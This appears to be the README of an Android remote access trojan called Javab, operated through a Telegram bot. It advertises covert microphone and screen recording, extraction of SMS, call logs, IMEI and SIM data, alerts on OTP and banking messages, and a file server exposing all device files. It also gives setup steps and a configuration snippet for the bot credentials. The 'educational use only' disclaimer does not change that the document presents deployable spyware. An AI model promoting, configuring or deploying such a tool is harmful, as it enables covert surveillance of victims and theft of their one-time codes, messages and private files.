# 📱 Javab – Android Remote Administration Tool (RAT)

<p align="center">
  <img src="https://img.shields.io/badge/version-2.0-blue" alt="Version">
  <img src="https://img.shields.io/badge/platform-Android-green" alt="Platform">
  <img src="https://img.shields.io/badge/control-Telegram%20Bot-blueviolet" alt="Control">
  <img src="https://img.shields.io/badge/status-active-brightgreen" alt="Status">
</p>

**Javab** is a powerful Android RAT (Remote Administration Tool) that allows you to monitor and control a device remotely through a **Telegram Bot**. It offers an interactive inline‑keyboard for easy, fast control over a wide range of features.

> **⚠️ EDUCATIONAL USE ONLY**  
> This project is intended strictly for educational and authorised security research. Unauthorised access to a device you do not own or have explicit permission to test is **illegal** and **unethical**. The author assumes no liability for misuse.

---

## ✨ Features (11 Total)

| # | Feature | Description |
|---|---------|-------------|
| 1 | 🎙️ **Audio Recording** | Record ambient audio from the device microphone. Choose duration remotely. |
| 2 | 🎥 **Screen Recording** | Capture screen activity with or without audio. Supports durations from 10s to 10min. |
| 3 | 📸 **Screenshot** | Take a high‑quality screenshot of the current screen instantly. |
| 4 | 🔦 **Flashlight ON/OFF** | Remotely turn the device flashlight on or off (requires Android 6+). |
| 5 | 📊 **Phone Status** | View real‑time battery percentage, recording status, and Android version. |
| 6 | 📱 **App Check** | List all installed non‑system apps and detect the currently running foreground app. |
| 7 | ⚠️ **Dangerous SMS Alert** | Receive an instant warning on Telegram when a suspicious SMS (OTP, bank, password) is received. |
| 8 | 📡 **SIM Info** | Retrieve carrier name, IMEI, phone number, and SIM serial number. |
| 9 | 📞 **Call History** | Extract complete call logs (number, type, date, duration) and send as a text file. |
| 10 | ✉️ **SMS Inbox** | Extract all received SMS and send as a text file. |
| 11 | 🌐 **Connect Device (Fast File Transfer)** | Start a built‑in HTTP file server on the device. Access and download any file directly via a browser over Wi‑Fi – superfast, no size limits! |

All features are controlled via a **Telegram Bot** with an intuitive inline‑keyboard menu.

---

## 🚀 Quick Start

### 1. Create a Telegram Bot
- Open Telegram and search for [`@BotFather`](https://t.me/BotFather).
- Send `/newbot` and follow the instructions.
- Copy the **bot token** (e.g., `1234567890:ABCdef...`).

### 2. Get Your Chat ID
- Search for [`@userinfobot`](https://t.me/userinfobot).
- Start the bot and send any message. Copy the **numeric Chat ID** it returns.

### 3. Configure the Bot Credentials
Open `app/src/main/java/com/zero/xploid/Config.java` and replace the placeholders:

```java
package com.zero.xploid;

public class Config {
    public static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    public static final String CHAT_ID = "YOUR_CHAT_ID_HERE";
}